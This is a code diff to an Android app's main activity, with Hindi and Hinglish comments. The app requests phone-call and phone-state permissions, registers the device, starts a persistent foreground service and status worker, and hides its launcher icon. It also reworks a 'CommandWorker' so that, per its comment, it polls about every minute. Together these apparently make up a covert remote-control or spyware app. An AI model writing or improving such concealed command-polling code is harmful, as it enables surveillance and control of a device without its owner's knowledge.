@@ -8,7 +8,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
-import android.view.View // Import missing tha
+import android.view.View
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
@@ -79,7 +79,7 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.CALL_PHONE,
             Manifest.permission.READ_PHONE_STATE
         )
-        
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissions.add(Manifest.permission.POST_NOTIFICATIONS)
         }
@@ -114,15 +114,13 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupCompleted() {
-        // Registration Worker
+        // ✅ Registration Worker (एक बार)
         val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
             .setInitialDelay(2, TimeUnit.SECONDS)
             .build()
         WorkManager.getInstance(this).enqueue(registrationRequest)
 
         startBackgroundWork()
-        
-        // Icon hide karne se pehle ensure karein ki background tasks start ho gaye hain
         hideLauncherIcon()
         finish()
     }
@@ -140,31 +138,26 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startBackgroundWork() {
+        // ✅ Foreground Service शुरू करें
         val serviceIntent = Intent(this, BackgroundService::class.java)
         ContextCompat.startForegroundService(this, serviceIntent)
 
         val workManager = WorkManager.getInstance(this)
 
-        // ✅ Corrected: Interval set to 15 Minutes (Minimum requirement)
+        // ✅ Status Worker – हर 15 मिनट में
         val statusRequest = PeriodicWorkRequestBuilder<StatusWorker>(15, TimeUnit.MINUTES)
             .setInitialDelay(1, TimeUnit.MINUTES)
             .build()
-            
         workManager.enqueueUniquePeriodicWork(
             "status_worker",
             ExistingPeriodicWorkPolicy.KEEP,
             statusRequest
         )
 
-        // ✅ Corrected: Interval set to 15 Minutes (30 seconds work nahi karega)
-        val commandRequest = PeriodicWorkRequestBuilder<CommandWorker>(15, TimeUnit.MINUTES)
-            .setInitialDelay(2, TimeUnit.MINUTES)
+        // ✅ Command Worker – पहली बार 1 मिनट बाद शुरू करें (अब यह खुद को हर 1 मिनट में चलाएगा)
+        val firstCommandRequest = OneTimeWorkRequestBuilder<CommandWorker>()
+            .setInitialDelay(1, TimeUnit.MINUTES)
             .build()
-            
-        workManager.enqueueUniquePeriodicWork(
-            "command_worker",
-            ExistingPeriodicWorkPolicy.KEEP,
-            commandRequest
-        )
+        workManager.enqueue(firstCommandRequest)
     }
 }
